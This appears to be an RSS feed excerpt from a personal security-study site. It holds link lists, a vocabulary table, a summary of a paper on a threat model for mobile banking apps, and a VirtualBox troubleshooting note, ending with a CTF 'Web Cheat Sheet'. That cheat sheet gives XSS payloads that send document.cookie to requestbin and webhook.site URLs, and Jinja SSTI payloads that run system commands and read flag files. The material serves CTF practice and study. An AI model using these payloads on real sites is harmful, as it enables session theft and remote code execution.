 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.yougetsignal.com/">Everything About Net Scanning&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.howtohaven.com/system/how-to-hash-file-on-windows.shtml#void">How to fetch SHA1 or MD5 in Win.&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://www.netadmin.com.tw/netadmin/zh-tw/technology/EDC6D4560B184F0D9E7A750862D3C9E4">How to split windows in WSL?&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;a href="https://yingclin.github.io/2018/docker-basic.html">Docker基本命令&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="vocabulary">
 Vocabulary
 &lt;a class="anchor" href="#vocabulary">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Vocabulary&lt;/th>
 &lt;th>Def.&lt;/th>
 &lt;th>Comment&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>Parse&lt;/td>
 &lt;td>解析&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>query&lt;/td>
 &lt;td>詢問、請求&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>dump&lt;/td>
 &lt;td>Also called a crash dump or memory dump, a dump is raw data from a computer&amp;rsquo;s memory. It is written to the file system if software crashes&amp;quot; (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it.&lt;/td>
 &lt;td>&lt;a href="https://www.computerhope.com/jargon/d/dump.htm">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>intruder&lt;/td>
 &lt;td>入侵者&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>vulnerability&lt;/td>
 &lt;td>漏洞、脆弱&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>exploit&lt;/td>
 &lt;td>An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network.&lt;/td>
 &lt;td>&lt;a href="https://www.trendmicro.com/vinfo/us/security/definition/exploit">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>wrapper&lt;/td>
 &lt;td>偽協議&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Cipher&lt;/td>
 &lt;td>密碼&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>nerf&lt;/td>
 &lt;td>cause to be weak or ineffective削弱、減弱&lt;/td>
 &lt;td>&lt;a href="https://english.cool/op-nerf-buff/">Refer&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Miscellaneous&lt;/td>
 &lt;td>混雜的、各種各樣的&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>PoC&lt;/td>
 &lt;td>Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>PWN&lt;/td>
 &lt;td>1.具漏洞的服務&lt;/br>2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權&lt;/td>
 &lt;td>&lt;a href="https://csc.nccst.nat.gov.tw/shield.aspx/">Refer1&lt;/a>&lt;/br>&lt;a href="https://ithelp.ithome.com.tw/articles/10295763">Refer2&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>DHCP&lt;/td>
 &lt;td>主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ycc.idv.tw/confusion-matrix.html">秒懂Confusion Matrix&lt;/a>&lt;/td>
 &lt;td>&lt;img src="https://ycc.idv.tw/media/mechine_learning_measure/mechine_learning_measure.002.jpeg" alt="" />&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="ithelp">
 IThelp
 &lt;a class="anchor" href="#ithelp">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Information-Security&lt;/th>
 &lt;th>Web-Security&lt;/th>
 &lt;th>Python&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10282551">惡意程式(malware)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202811">Day 4 很像走迷宮的sqlmap&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10235251">[Series - 8] Python時間轉換介紹&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10240752">不安全的連線？HTTPS與SSL憑證&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10249489">[Day20]-新手的Web系列SQLmap&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10185182">[第06天] 資料結構（3）Data Frame&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10248442">Day 018.聽起來好像很厲害的-密碼學&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">Day 12 - PHP 偽協議 (一) &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10231535">dlib安裝心得 &amp;ndash; Windows 環境&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10278494">Day21-針對Metasploitable 3進行滲透測試(2)-Shell &amp;amp; Reverse Shell基礎知識&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10244403">[Day13]-SSTI(Server-side template injection)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10261688">【Day 9】Python打包程式&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10193762">[2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10272749">[Day11]SSTI(Server Side Template Injection)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10280076">[Day28] 儲存訓練好的模型&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10193241">[2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10240486">[Day7]-PHP(LFI/RFI)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10258195">[Python]關鍵字yield和return究竟有什麼不同?&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10249953">Day 21.加密演算法要注意的那些毛(一)-加密模式&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10208651">[Day23]forensics的開始&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227380">『Day 27』拜託別Pwn我啦！-常見的工具（下）&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Deep-Learning&lt;/th>
 &lt;th>Big-Data&lt;/th>
 &lt;th>Linux&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10209058">[演算法]K-means分群(K-means Clustering)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10200912">[改善資料品質]Part-1 EDA &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10127590">從沒圖進化到有圖有字的工具：cowsay&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10187314">[第24天] 機器學習（4）分群演算法&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10207473">Day18-shell是什麼？&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227098">[AI#10]人臉辨識&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10257294">C語言工具使用，GDB個人學習筆記&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10229049">淺談機器學習的效能衡量指標(2)&amp;ndash;ROC/AUC曲線&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10273094">[Day15]機器學習常勝軍-XGBoost &lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227654">[Day20]Lasso和Ridge正規化回歸&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Web-Develop&lt;/th>
 &lt;th>JS&lt;/th>
 &lt;th>Webpage-Automation&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10224417">17. [FE] 為什麼現在的前端都在用「框架」？&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202260">你不可不知的 JavaScript 二三事#Day3：資料型態的夢魘——動態型別加弱型別(2)&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10229959">鼠年全馬鐵人挑戰 WEEK 06：Selenium 自動化測試工具 &lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10274829">D29-如何打包Apps Script的程式碼？（二）包成HTML網頁與或API&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10221214">10. [JS] 一般函式與箭頭函式的差異？ &lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10230717">鼠年全馬鐵人挑戰 WEEK 09：Selenium WebDriver (下)&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10202689">Day03-深入理解網頁架構：DOM&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10281036">【Day 27】-再爬一次Dcard?(實戰向 Dcard API 發出請求)&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114805">PHP物件導向的第四課：繼承&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10196817">[Day23]Beautiful Soup網頁解析！&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114707">PHP物件導向的第二課：重談「方法」，物件「屬性」及「成員」&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10247175">[Day 17] Instagram - 模擬登入&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10114633">PHP物件導向的第一課：class&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10224935">Day 20 Authentication基礎概念介紹：session、cookie and token&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10207241">Day 17 - 會員登入系統&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10197921">XAMPP安裝與操作初步&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10237545">What is metadata?&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Reverse-Engineering&lt;/th>
 &lt;th>Others&lt;/th>
 &lt;th>PWN&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10187490">[Day10]格式透視-解析PE文件格式（前篇）&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10237039">第二天：要了解DLL你要先講啊&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227326">『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） &lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10188209">[Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10238425">第四天：Dll聽話 讓我看看&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10227380">『Day 27』拜託別Pwn我啦！-常見的工具（下）&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10223580">Day16-分散式系統溝通的方法-RPC&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10226977">Day25: [Misc] 我從來沒想過我會害怕寫 code&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10283174">C語言雜談01&amp;mdash;如何理解條件編譯&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10217608">C#編譯到執行與Java的相似之處&lt;/a>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;td>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="conference--journal-for-information-security">
 Conference &amp;amp; Journal For Information Security
 &lt;a class="anchor" href="#conference--journal-for-information-security">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=10206">IEEE TIFS&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ieeexplore.ieee.org/xpl/RecentIssue.jsp?punumber=8858">IEEE TDSC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://dl.acm.org/journal/tops">ACM TISSEC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.acsac.org/">ACSAC&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.usenix.org/conference/usenixsecurity22">Usenix security&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>VAPTAi: A Threat Model for Vulnerability Assessment and Pentesting of Android and iOS Mobile Banking Apps</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/vaptai_-a-threat-model-for-vulnerability-assessment-and-pentesting-of-android-and-ios-mobile-banking-apps/</guid><description>&lt;h1 id="vaptai-a-threat-model-for-vulnerability-assessment-and-penetration-testing-of-android-and-ios-mobile-banking-apps">
 VAPTAi: A Threat Model for Vulnerability Assessment and Penetration Testing of Android and iOS Mobile Banking Apps
 &lt;a class="anchor" href="#vaptai-a-threat-model-for-vulnerability-assessment-and-penetration-testing-of-android-and-ios-mobile-banking-apps">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Bojjagani, S., &amp;amp; Sastry, V. N. (2017, October). VAPTAi: a threat model for vulnerability assessment and penetration testing of android and iOS mobile banking apps. In 2017 IEEE 3rd international conference on collaboration and internet computing (CIC) (pp. 77-86). IEEE.
:::&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>隨著移動設備的使用急速增加，Mobile Banking Application(MBA)也備受黑客和惡意使用者的目標。這些MBA存儲、傳輸和存取敏感和機密資訊，因此必須優先確保其安全性。本文提出了一個威脅模型，以系統性地測試和分析行動銀行應用程式，檢測和緩解應用程式級和通信級別的漏洞。作者對5個Android和3個iOS的MBA進行了安全測試，發現了許多未知漏洞，並展示了MBA易受中間人攻擊的情況。部分MBA使用簡單的HTTP協議傳輸用戶數據，未考慮安全要求。多數情況下，MBA無條件接受偽造或自簽名的證書，導致SSL/TLS中間人攻擊。&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="proposed-method">
 Proposed Method
 &lt;a class="anchor" href="#proposed-method">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://hackmd.io/_uploads/Syab2Ut40.png" alt="圖片" />&lt;/p></description></item><item><title>VirtualBox滑鼠無法跳出</title><link>https://bernie6401.github.io/docs/problem-solutions/virtualbox%E6%BB%91%E9%BC%A0%E7%84%A1%E6%B3%95%E8%B7%B3%E5%87%BA/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/virtualbox%E6%BB%91%E9%BC%A0%E7%84%A1%E6%B3%95%E8%B7%B3%E5%87%BA/</guid><description>&lt;h1 id="virtualbox滑鼠無法跳出">
 VirtualBox滑鼠無法跳出
 &lt;a class="anchor" href="#virtualbox%e6%bb%91%e9%bc%a0%e7%84%a1%e6%b3%95%e8%b7%b3%e5%87%ba">#&lt;/a>
&lt;/h1>
&lt;h2 id="problem-description">
 Problem Description
 &lt;a class="anchor" href="#problem-description">#&lt;/a>
&lt;/h2>
&lt;p>在VirtualBox中如果滑鼠無法跳回本機，請先按照其他blog提出的solution自行排除&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>，如果暫時找不到解決辦法，也可以參考&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>的做法，Ctrl+Alt+Del強制本機電腦跳出windows選項，此時滑鼠的控制權就會交回到本機端&lt;/p>
&lt;h2 id="solution">
 Solution
 &lt;a class="anchor" href="#solution">#&lt;/a>
&lt;/h2>
&lt;p>我的狀況是鍵盤是新買的小鍵盤，所以沒有Right Ctrl可以用，只有左邊，而且安裝增強功能VirtualBox會一直跳出&amp;quot;無法掛載映像檔&amp;quot;的字樣，最後是參考&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>中下面有一半教學是示範linux遇到這個問題要如何解決，簡單說就是手動在控制器的地方加入光碟機，並且選擇VBoxGuestAddition.iso，之後重開機就可以了
&lt;img src="https://hackmd.io/_uploads/rJc9d3Sp3.png" alt="" />
之後在VM的主視窗中選擇==插入Guest Additions CD映像檔==，就可以在系統中看到CD被掛載上去了，只要按照一般的安裝流程在reboot就可以解決滑鼠自由移動的目的了
&lt;img src="https://hackmd.io/_uploads/SJjrYhrT2.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/r1R5Y3H63.png" alt="" />&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://blog.csdn.net/lijun5635/article/details/8715915">VirtualBox中鼠標在主機和虛擬機之間切換&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:2">
&lt;p>&lt;a href="https://support.huaweicloud.com/bestpractice-ims/ims_bp_0010.html">在Windows虛擬機中安裝Virtualbox增強功能&lt;/a>&amp;#160;&lt;a href="#fnref:2" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:3">
&lt;p>&lt;a href="https://zhidao.baidu.com/question/280635794.html"> oracle vm virtualbox 怎麽讓鼠標出來啊？ &lt;/a>&amp;#160;&lt;a href="#fnref:3" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:4">
&lt;p>&lt;a href="https://blog.moa.tw/2012/08/virtualbox-windowshostvm.html"> [VirtualBox] windows下解決移除Host鍵後VM滑鼠無法移出 &lt;/a>&amp;#160;&lt;a href="#fnref:4" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;li id="fn:5">
&lt;p>&lt;a href="https://www.jinnsblog.com/2021/05/virtualbox-guest-additions-install-guide.html">Virtualbox Guest Additions 安裝教學 [Linux / Windows]&lt;/a>&amp;#160;&lt;a href="#fnref:5" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/div></description></item><item><title>Web Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/web-cheat-sheet/</guid><description>&lt;h1 id="web-cheat-sheet">
 Web Cheat Sheet
 &lt;a class="anchor" href="#web-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="online-tools">
 Online Tools
 &lt;a class="anchor" href="#online-tools">#&lt;/a>
&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Fuck&lt;/th>
 &lt;th>Beautifier&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>&lt;a href="http://www.jsfuck.com/">jsfuck&lt;/a>&lt;/td>
 &lt;td>&lt;a href="http://www.jsnice.org/">JSNice&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/jjencode.html">jjencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://beautifier.io/">JS 反混淆器&lt;/a>: 可以反混淆或解密JS的檔案&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://utf-8.jp/public/aaencode.html">aaencode&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://js.wfuapp.com/">JS 壓縮+加密+混淆+美化&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;a href="https://esolangs.org/wiki/Language_list">Esolang List&lt;/a>&lt;/td>
 &lt;td>&lt;a href="https://www.53lu.com/tool/jsfuckdecode/">JS Fuck Decode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>&lt;/td>
 &lt;td>&lt;a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode&lt;/a>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="cheat-sheet">
 Cheat-Sheet
 &lt;a class="anchor" href="#cheat-sheet">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS-CheatSheet&lt;/a>
利用XSS把session打到webhook上:
&lt;pre tabindex="0">&lt;code class="language-javascript?" data-lang="javascript?">window.location=&amp;lt;requestbin.com&amp;gt;/?a+document.cookie
// or
fetch(&amp;#34;https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194&amp;#34;, { method: &amp;#39;GET&amp;#39;, headers: { &amp;#39;Cookie&amp;#39;: document.cookie } })
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%19Injection/README.md">All-Injection&lt;/a>&lt;/li>
&lt;li>SSTI Payload: 記得找==os._wrap_close==
&lt;pre tabindex="0">&lt;code>{{().__class__.__base__.__subclasses__()[132].__init__.__globals__[&amp;#39;system&amp;#39;](&amp;#39;id&amp;#39;)}}
{{self.__init__.__globals__.__builtins__.__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;cat%20Flag.txt&amp;#34;).read()}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, &amp;#34;./flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#34;cat /flag.txt&amp;#34;)}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;execl&amp;#39;](&amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
{{().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&amp;#39;spawnl&amp;#39;](&amp;#39;P_WAIT&amp;#39;, &amp;#34;/bin/cat&amp;#34;, &amp;#34;cat&amp;#34;, file.lower())}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="others">
 Others
 &lt;a class="anchor" href="#others">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>wasm $\to$ c: &lt;a href="https://github.com/WebAssembly/wabt">wabt&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!"># 按照說明build完後進到./build
$ ./wasm2c {wasm file path} -o {output c file path}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Webhook
&lt;a href="https://webhook.site/">Webhook.site&lt;/a>
&lt;a href="https://beeceptor.com/">Beeceptor&lt;/a>
